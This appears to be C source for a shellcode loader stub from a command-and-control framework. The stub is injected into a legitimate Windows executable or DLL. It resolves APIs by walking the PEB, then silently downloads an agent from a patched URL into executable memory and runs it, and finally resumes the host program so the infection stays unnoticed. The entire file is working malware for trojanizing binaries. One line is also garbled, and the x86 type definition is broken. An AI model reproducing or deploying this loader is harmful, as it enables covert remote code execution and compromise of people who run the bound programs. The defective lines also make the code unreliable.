/*
 * Position-independent Windows loader stub (compiled to flat shellcode).
 *
 * Injected by the C2 "Native Binder" into a host PE: a new .c2 section is added
 * and the entry point is repointed here. At runtime this stub:
 *   1. Resolves kernel32 + APIs via a PEB/Ldr walk (no imports, no CRT).
 *   2. Spawns a background thread that downloads the Position-Independent-Agent
 *      (PIA) .bin from the patched URL over WinINet and runs it in-memory.
 *   3. Resumes the host's original entry point so the legit binary runs normally.
 *
 * One source builds both x64 and x86 (offsets selected by __x86_64__).
 *
 * Two fields are patched by the binder at bind time (both ASCII-findable so the
 * shared LoaderUrlPatcher works):
 *   - SHELLCODE_URL_PLACEHOLDER : 256-byte slot holding the agent URL.
 *   - C2OEPRAV + 4 bytes        : the host's original entry-point RVA (uint32 LE).
 *
 * Build (CI): mingw gcc -ffreestanding -fPIC ... then ld --oformat binary →
 * stub-x64.bin / stub-x86.bin. See stub.ld + release.yml.
 */

#include <intrin.h> /* provides __readgsqword / __readfsdword as inline intrinsics (no CRT) */

/* Entry-point mode: exactly one of BUILD_FOR_DLL / BUILD_FOR_EXE must be defined
 * on the compile line (see README). The binder picks the variant matching the
 * host it injects into. */
#if defined(BUILD_FOR_DLL) && defined(BUILD_FOR_EXE)
#error "Define only one of BUILD_FOR_DLL or BUILD_FOR_EXE, not both."
#endif

#ifdef __x86_64__
typedef unsigned long long uptr;
#define PEB() ((uptr)__readgsqword(0x60))
#define LDR_OFF 0x18
#define INMEM_OFF 0x20
#define INLOAD_OFF 0x10
#define DBASE_INMEM 0x20  /* DllBase offset from an InMemoryOrderLinks node */
#define DBASE_INLOAD 0x30 /* DllBase offset from an InLoadOrderLinks node   */
#define EXPDIR_OFF 0x88   /* ex#define EXPDIR_OFF 0x88   /* export data dir RVA field, from e_lfanew       */
#else
typedef unsigned long long uptr;
#define PEB() ((uptr)__readfsdword(0x30))
#define LDR_OFF 0x0C
#define INMEM_OFF 0x14
#define INLOAD_OFF 0x0C
#define DBASE_INMEM 0x10
#define DBASE_INLOAD 0x18
#define EXPDIR_OFF 0x78
#endif

typedef unsigned int u32;
typedef unsigned short u16;

/* ── API function-pointer types ───────────────────────────────────────────── */
typedef void *(WINAPI *GetProcAddress_t)(void *hModule, const char *name);
typedef void *(WINAPI *LoadLibraryA_t)(const char *lib);

typedef void *(WINAPI *VirtualAlloc_t)(
    void *addr,
    uptr size,
    u32 allocType,
    u32 protect);

typedef void *(WINAPI *CreateThread_t)(
    void *sa,
    uptr stack,
    u32(WINAPI *start)(void *),
    void *param,
    u32 flags,
    u32 *tid);

typedef void *(WINAPI *InternetOpenA_t)(
    const char *agent,
    u32 access,
    const char *proxy,
    const char *bypass,
    u32 flags);

typedef void *(WINAPI *InternetOpenUrlA_t)(
    void *hInternet,
    const char *url,
    const char *headers,
    u32 hlen,
    u32 flags,
    uptr ctx);

typedef int(WINAPI *InternetReadFile_t)(
    void *hFile,
    void *buf,
    u32 toRead,
    u32 *bytesRead);

struct API
{
    LoadLibraryA_t pLoadLibraryA;
    VirtualAlloc_t pVirtualAlloc;
    CreateThread_t pCreateThread;
    InternetOpenA_t pInternetOpenA;
    InternetOpenUrlA_t pInternetOpenUrlA;
    InternetReadFile_t pInternetReadFile;
};

/* ── Helpers ──────────────────────────────────────────────────────────────── */

static int streq(const char *a, const char *b)
{
    while (*a && *b)
    {
        if (*a != *b)
            return 0;
        a++;
        b++;
    }
    return *a == *b;
}

/* kernel32 base = 3rd entry of PEB.Ldr.InMemoryOrderModuleList (common Win10/11 order). */
static uptr kernel32_base(void)
{
    uptr peb = PEB();
    uptr ldr = *(uptr *)(peb + LDR_OFF);
    uptr e = *(uptr *)(ldr + INMEM_OFF); /* 1st entry's InMemoryOrderLinks */
    e = *(uptr *)e;                      /* 2nd */
    e = *(uptr *)e;                      /* 3rd (kernel32) */
    return *(uptr *)(e + DBASE_INMEM);
}

static void *resolve_export(uptr base, const char *name)
{
    u32 e_lfanew = *(u32 *)(base + 0x3c);
    uptr expDir = base + *(u32 *)(base + e_lfanew + EXPDIR_OFF);
    u32 numNames = *(u32 *)(expDir + 0x18);
    uptr names = base + *(u32 *)(expDir + 0x20);
    uptr funcs = base + *(u32 *)(expDir + 0x1c);
    uptr ords = base + *(u32 *)(expDir + 0x24);

    for (u32 i = 0; i < numNames; i++)
    {
        const char *expName = (const char *)(base + *(u32 *)(names + i * 4));
        if (streq(expName, name))
        {
            u16 ord = *(u16 *)(ords + i * 2);
            return (void *)(base + *(u32 *)(funcs + ord * 4));
        }
    }
    return 0;
}

/* ── Background download + execute ────────────────────────────────────────── */
char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";

static u32 download_thread(void *param)
{
    struct API api;

    uptr k32 = kernel32_base();
    if (!k32)
        return 0;

    api.pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");

    api.pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");

    uptr wininet = (uptr)api.pLoadLibraryA("wininet.dll");
    if (wininet)
    {
        api.pInternetOpenA = (InternetOpenA_t)resolve_export(wininet, "InternetOpenA");
        api.pInternetOpenUrlA = (InternetOpenUrlA_t)resolve_export(wininet, "InternetOpenUrlA");
        api.pInternetReadFile = (InternetReadFile_t)resolve_export(wininet, "InternetReadFile");
    }

    void *buf = api.pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
    if (!buf)
        return 0;

    void *hInternet = api.pInternetOpenA(0, 0, 0, 0, 0);
    if (!hInternet)
        return 0;

    void *hUrl = api.pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
    if (!hUrl)
        return 0;
    uptr off = 0;
    u32 got = 0;
    do
    {
        api.pInternetReadFile(hUrl, (char *)buf + off, 0x100000, &got);
        off += got;
    } while (got && off < 0x400000);

    if (off)
        return ((u32 (*)(void))buf)(); /* run the PIC agent */
    return 0;
}

/* ── Entry (placed first in .text via section attr) ───────────────────────── */

#if defined(BUILD_FOR_DLL)

/* DLL entry: the binder wires this stub in as the host DLL's DllMain. hinstDLL
 * is the image base; on DLL_PROCESS_ATTACH (fdwReason == 1) we spawn the stager
 * thread, then tail-call the original DllMain at base + OEP RVA. */
__attribute__((section(".text.start"), used)) int WINAPI _start(void *hinstDLL,
                                                                int fdwReason,
                                                                void *lpReserved)
{
    if (fdwReason == 1)
    {
        struct API api;
        uptr k32 = kernel32_base();
        if (!k32)
            return 0;
        api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");

        if (api.pCreateThread)
            api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, 0, 0, 0);
    }

    volatile char c2_oep[12] = "C2OEPRAV";   /* volatile: prevent the -O2 constant-fold that erased this marker */
    u32 oep = *(volatile u32 *)(c2_oep + 4); /* original entry-point RVA (patched by binder) */
    return ((int WINAPI (*)(void *, int, void *))((uptr)hinstDLL + oep))(hinstDLL, fdwReason, lpReserved);
}

#elif defined(BUILD_FOR_EXE)

/* EXE entry: the binder repoints the host EXE's entry point here. An EXE entry
 * receives no image-base argument, so derive the base from
 * PEB.Ldr.InLoadOrderModuleList[0] (the EXE itself), spawn the stager thread,
 * then jump to the original OEP. */
__attribute__((section(".text.start"), used)) void _start(void)
{
    struct API api;
    uptr k32 = kernel32_base();
    if (!k32)
        return;

    api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");

    if (api.pCreateThread)
        api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, &api, 0, 0);

    /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
    uptr peb = PEB();
    uptr ldr = *(uptr *)(peb + LDR_OFF);
    uptr first = *(uptr *)(ldr + INLOAD_OFF);
    uptr base = *(uptr *)(first + DBASE_INLOAD);

    volatile char c2_oep[12] = "C2OEPRAV";
    u32 oep = *(volatile u32 *)(c2_oep + 4);
    ((void (*)(void))(base + oep))();

    for (;;)
    {
    } /* never reached for an EXE entry */
}
#endif
